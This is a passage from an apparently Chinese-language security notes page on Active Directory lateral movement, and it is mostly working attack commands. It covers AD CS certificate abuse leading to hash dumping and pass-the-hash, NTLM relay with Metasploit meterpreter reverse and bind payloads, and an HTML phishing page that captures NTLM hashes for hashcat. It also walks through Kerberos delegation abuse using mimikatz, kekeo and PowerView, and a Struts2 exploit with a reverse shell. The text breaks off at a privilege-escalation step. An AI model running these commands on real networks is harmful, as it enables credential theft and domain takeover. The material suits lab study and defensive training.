）前提条件：<br>\n一个域内普通账号、域内存在证书服务器 ，可以用 certutial -config -ping 可以判断，如果报错则不存在证书服务器，如果提示其他信息则说明存在，也 可以用 spn 检测。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. Kali添加访问域内信息 /etc/hosts</span></span><br><span class=\"line\">192.168.1.15 xiaodi.local xiaodi-WIN-3C7SS32SQ6R-CAWIN-3C7SS32SQ6 R.xiaodi.local</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 获取CA结构名和计算机名</span> </span><br><span class=\"line\">certutil -config - - ping</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 域内信息: 192.168.1.15 <span class=\"built_in\">test</span> Pass123</span></span><br><span class=\"line\">xiaodi-WIN-3C7SS32SQ6R-CA</span><br><span class=\"line\">WIN-3C7SS32SQ6R.xiaodi.local</span><br></pre></td></tr></table></figure>\n<p>（ 2 ）漏洞利用步骤</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 申请低权限用户证书：</span></span><br><span class=\"line\">certipy req &#x27;xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 检测证书:</span></span><br><span class=\"line\">certipy auth -pfx test.pfx</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 创建一个机器账户：</span></span><br><span class=\"line\">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.1.15 addComputer pwnmachine &#x27;CVEPassword1234*&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">d. 设置机器账户属性(dNSHostName和DC一致)：</span></span><br><span class=\"line\">python3 bloodyAD.py -d xiaodi.local -u test -p &#x27;Pass123&#x27; --host 192.168.1.15 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local&#x27; dNSHostName &#x27;[&quot;WIN-3C7SS32SQ6R.xiaodi.local&quot;]&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">e. 再次申请证书：</span></span><br><span class=\"line\">certipy req &#x27;xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.1.15&#x27; -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">f. 检测证书：</span></span><br><span class=\"line\">certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">g. 导出HASH：</span></span><br><span class=\"line\">python3 secretsdump.py &#x27;xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local&#x27; -hashes :10e02bef2258ad9b239e2281a01827a4</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">h. 利用HASH：</span></span><br><span class=\"line\">python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</span><br></pre></td></tr></table></figure>\n<h3 id=\"其他横向手段\"><a class=\"markdownIt-Anchor\" href=\"#其他横向手段\">#</a> 其他横向手段</h3>\n<h4 id=\"ntlm-relay-重放\"><a class=\"markdownIt-Anchor\" href=\"#ntlm-relay-重放\">#</a> NTLM Relay 重放</h4>\n<p>与 NLTM 认证相关的安全问题主要有 Pass The Hash、利用 NTLM 进行信息收集、Net-NTLM Hash 破解、NTLM Relay 几种。PTH 前期已经了，运用 m imikatz、impacket 工具包的一些脚本、CS 等等都可以利用，NTLM Relay 又包括 (relay to smb,ldap,ews)</p>\n<p>可以应用在获取不到明文或 HASH 时采用的手法，但也要注意手法的必备条件。</p>\n<p>域内用户主机的非域用户角色即 administartor 登录 = 时，如果采用 dir \\192.168.x.x\\c$ 的方式去访问其他主机的文件，会将当前主机的用户名和密码进行 碰撞，如果对方主机恰好采用了相同的登录名和密码，则碰撞成功，取得访问权限成功。</p>\n<p>条件：需要一台域内主机管理员权限，通讯双方当前用户密码一致</p>\n<p>以下命令主要是用 msf 做了中继，现将 cs 中的主机联动到 msf，在 msf 中添加路由，选择 smb 重发模块，通过主动连接的方式使肉鸡可以连接到 msf。 当跳板机使用自己的用户名和密码去碰撞 kali 用户名密码时，msf 监听到此碰到并转发给肉机进行碰撞尝试。一旦碰撞成功，就会得到肉机的权限。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置木马</span></span><br><span class=\"line\">CS创建外联监听器，选择外围http的方式，并命名为msf，输入命令spawn msf，将当前主机的权限移交给msf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF: 监听上线：</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 8888</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加路由：</span></span><br><span class=\"line\">run autoroute -p # 查看当前路由表</span><br><span class=\"line\">run post/multi/manage/autoroute # 添加当前路由表</span><br><span class=\"line\">backgroup # 返回</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重发模块：</span></span><br><span class=\"line\">use exploit/windows/smb/smb_relay</span><br><span class=\"line\">set smbhost 192.168. 3. 32 //攻击目标</span><br><span class=\"line\">set rhost 192.168.3. 32 //设置连接目标</span><br><span class=\"line\">set autorunscript post/windows/manage/migrate</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">主动连接：</span></span><br><span class=\"line\">set payload windows/meterpreter/bind_tcp</span><br><span class=\"line\">dir \\\\192.168.46.166\\c$ //设置本地IP</span><br><span class=\"line\">jobs 查看当前任务</span><br><span class=\"line\">jobs - K 删除当前任务</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">system-&gt;administrator</span></span><br></pre></td></tr></table></figure>\n<p>cs: ps 看哪个进程启用的是 administrator 权限，利用 steal_token pid 来窃取权限，getuid 检验，检验得到是 administrator 的情况时，使用 shell dir \\192.168.46.166\\c$ 进行碰撞。此后将会在 msf 中上线肉机。</p>\n<p>msf: 监听 smb 重发模块之后，返回跳板机 meterpreter 会话，选择 ps，查看拥有 administrator 权限的主机，输入 migrate pid 进行权限修改，getuid 检验权限，输入 shell 执行 dir \\192.168.46.166\\c$ 会上线肉机，通过 sessions 查看当前是否存在了新的肉机。</p>\n<h4 id=\"ntlm-inveigh-嗅探\"><a class=\"markdownIt-Anchor\" href=\"#ntlm-inveigh-嗅探\">#</a> NTLM Inveigh 嗅探</h4>\n<p>条件：被控主机当前管理员权限</p>\n<p>（ 1 ）监听拦截 Inveigh.exe<br>\n 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdo\">https://github.com/Kevin-Robertson/Inveigh</span><br>\n 可以上传到肉机上，或者 socket 代理出来，执行之后配合钓鱼获取其他主机的 hash，获取到的是 NET NTLM HASH V1 或 V2。</p>\n<p>（ 2 ）触发拦截</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当肉机执行如下命令时会被拦截<span class=\"built_in\">hash</span></span></span><br><span class=\"line\">dir \\\\192.168.3.x\\c$</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以构造内网web进行钓鱼触发http://192.168.3.31/1.html</span></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;&lt;/title&gt;</span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;img src=&quot;file:///\\\\192.168.3.32\\2&quot;&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">破解密文 https://github.com/hashcat/hashcat/</span></span><br><span class=\"line\">hashcat -m 5600 hash pass.txt --show</span><br></pre></td></tr></table></figure>\n<h4 id=\"委派攻击分类\"><a class=\"markdownIt-Anchor\" href=\"#委派攻击分类\">#</a> 委派攻击分类</h4>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE1NTU=\">https://xz.aliyun.com/t/11555</span></p>\n<p>（ 1 ）非约束性委派 - 没有限制</p>\n<p>a. 非约束委派原理：<br>\n机器 A (域控) 访问具有非约束委派权限的机器 B 的服务，会把当前认证用户 (域管用户) 的的 TGT 放在 ST 票据中，一起发送给机器 B，机器 B 会把 TGT 存储在 lsass 进程中以备下次重用。从而机器 B 就能使用这个 TGT 模拟认 证用户 (域管用户) 访问服务。</p>\n<p>b. 利用场景：<br>\n攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的 TGT，从而模拟域管用户。</p>\n<p>c. 总结<br>\n首先判断委派的第三个设置，然后看针对用户，主动攻击。</p>\n<p>（ 2 ）约束性委派 - 有限制</p>\n<p>a. 约束委派原理：<br>\n由于非约束委派的不安全性，微软在 windows server 2003 中引入了约束委<br>\n派，对 Kerberos 协议进行了拓展，引入了 SService for User to Self (S4U2Self) 和 Service for User to Proxy (S4U2proxy)。</p>\n<p>b. 利用场景：<br>\n如果攻击者控制了服务 A 的账号，并且服务 A 配置了到域控的 CIFS 服务的约束性委派。则攻击者可以先使用 S4u2seflt 申请域管用户（administrator）访问 A 服务的 ST1，然后使用 S4u2Proxy 以 administrator 身份访问域控的 CIFS 服务，即相当于控制了域控。</p>\n<p>c. 总结<br>\n首先判断委派的第二个设置，然后看针对用户，后续钓鱼配合</p>\n<p>（ 3 ）基于资源的约束性委派 - 资源方面的限制</p>\n<p>a. 资源约束委派原理（不需要委派的任何设置！）：<br>\n基于资源的约束委派 (RBCD) 是在 Windows Server 2012 中新加入的功能，<br>\n与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD 把 设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。 也就是说机器自身可以直接在自己账户上配置 msDS-AllowedToActOnBehalfOfO therIdentity 属性来设置 RBCD。</p>\n<p>b. 利用条件：<br>\n域控 Windows2012 及以上、存在域内成员用户加入域操作</p>\n<p>c. 总结<br>\n只看 DC 是不是 2012 及以上帮版本，然后看针对用户，主动攻击。计算机加入域时，加入域的域用户被控后也将导致使用当前域用户加入的计算机受控。</p>\n<h4 id=\"非约束委派\"><a class=\"markdownIt-Anchor\" href=\"#非约束委派\">#</a> 非约束委派</h4>\n<ul>\n<li>复现配置</li>\n</ul>\n<p>域控配置机器的委派属性，信任此计算机来委派任何服务，并且在域控上执行 <code>setspn -U -A priv/test webadmin</code> ，于是 webadmin 有了委派权限。</p>\n<ul>\n<li>判断委派权限的服务账户和机器账户：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 查询域内设置了非约束委派的服务账户：</span></span><br><span class=\"line\">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 查询域内设置了非约束委派的机器账户:</span></span><br><span class=\"line\">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>\n<ul>\n<li>利用步骤：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 域控与委派机器通讯</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">域控主动执行：</span></span><br><span class=\"line\">net use \\\\webserver</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">钓鱼诱使域管访问：http://192.168.3.31/31.html</span></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;&lt;/title&gt;</span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    &lt;img src=&quot;file:///\\\\192.168.3.31\\2&quot;&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 导出票据到本地</span></span><br><span class=\"line\">mimikatz sekurlsa::tickets /export</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 导入票据到内存</span></span><br><span class=\"line\">mimikatz kerberos::ptt [0;fece8]- 2 - 0 - 60a00000-Administrator@krbtgt-GOD.ORG.kirbi</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">d. 连接通讯域控</span> </span><br><span class=\"line\">dir \\\\owa2010cn-god\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"约束委派\"><a class=\"markdownIt-Anchor\" href=\"#约束委派\">#</a> 约束委派</h4>\n<ul>\n<li>复现配置</li>\n</ul>\n<p>机器设置仅信任此计算机指定服务 - cifs、用户设置仅信任此计算机指定服务 - cifs</p>\n<ul>\n<li>判断查询</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 查询机器用户配置约束委派</span></span><br><span class=\"line\">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 查询服务账户配置约束委派</span></span><br><span class=\"line\">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>\n<ul>\n<li>利用步骤：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 获取用户的票据</span></span><br><span class=\"line\">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class=\"line\">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 利用用户票据获取域控票据</span></span><br><span class=\"line\">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god&quot; &quot;exit&quot;</span><br><span class=\"line\">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&quot; &quot;exit&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">c. 导入票据到内存</span></span><br><span class=\"line\">mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">d. 连接通讯域控</span></span><br><span class=\"line\">shell dir \\\\owa2010cn-god.god.org\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"资源约束委派\"><a class=\"markdownIt-Anchor\" href=\"#资源约束委派\">#</a> 资源约束委派</h4>\n<p>当多个计算机加入域时，可以使用同一域用户加入，如果有一台加入域的电脑被控，则其余使用该域用户加入域的主机都会被控。<br>\n计算机脱域时，需要输入域控账户密码，并且重启。计算机加入域时，需要域控先添加域用户，计算机通过此域用户加入域控，并且重启。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取受害目标</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">有哪些域内计算机存在同一用户加入的</span></span><br><span class=\"line\">AdFind.exe -h 192.168.3.33 -b &quot;DC=xiaodi,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否有相同sid值，有的话可以判断出有多用户使用该域用户加入了域</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">判断受害用户</span></span><br><span class=\"line\">sid2user.exe \\\\192.168.3.3 5 21 1695257952 3088263962 2055235443 1104</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">普通域用户设置用户名密码，为域控增加机器</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">项目地址：https://github.com/Kevin-Robertson/Powermad</span></span><br><span class=\"line\">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class=\"line\">Import-Module .\\Powermad.ps1</span><br><span class=\"line\">New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取新加的计算器的sid：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具地址：https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span></span><br><span class=\"line\">Import-Module .\\PowerView.ps1</span><br><span class=\"line\">Get-NetComputer serviceA -Properties objectsid</span><br><span class=\"line\">S-1-5-21-1695257952-3088263962-2055235443-1107</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置修改属性</span></span><br><span class=\"line\">import-module .\\powerview.ps1</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class=\"string\">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257 952-3088263962-2055235443-1107)&quot;</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">SDBytes = New-Object byte[] (<span class=\"variable\">$SD</span>.BinaryLength)</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">SD.GetBinaryForm(<span class=\"variable\">$SDBytes</span>, 0)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改原主机data用户的相关属性</span></span><br><span class=\"line\">Get-DomainComputer DATA| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">验证修改是否成功</span></span><br><span class=\"line\">Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">清除修改设置</span></span><br><span class=\"line\">Set-DomainObject DATA -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">建立代理连接目标获取票据：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">需要修改本地hosts文件，将以下两个域名从本地hosts文件中解析</span></span><br><span class=\"line\">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">对票据进行操作</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入票据到内存：</span></span><br><span class=\"line\">mimikatz kerberos::ptc administrator.ccache</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接利用票据：</span></span><br><span class=\"line\">dir \\\\data.xiaodi.local\\c$</span><br><span class=\"line\">python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass</span><br></pre></td></tr></table></figure>\n<h4 id=\"横向linux\"><a class=\"markdownIt-Anchor\" href=\"#横向linux\">#</a> 横向 linux</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-007.png\" alt></p>\n<p>（ 1 ）Web DMZ 权限获取</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">信息收集：</span></span><br><span class=\"line\">nmap 172.16.250.0/24</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据确定的 80 上的opensms10.3搜索漏洞利用方法：/struts2-showcase</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用msf进行st 2 漏洞利用：</span></span><br><span class=\"line\">use exploit/multi/http/struts2_content_type_ognl</span><br><span class=\"line\">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class=\"line\">set rhosts 172.16.250.10</span><br><span class=\"line\">set lport 80</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>（ 2 ）脏牛漏洞权限提升至 root（会把服务器打崩）</p>\n<figure class=\"highlight shell\"><table><tr><td 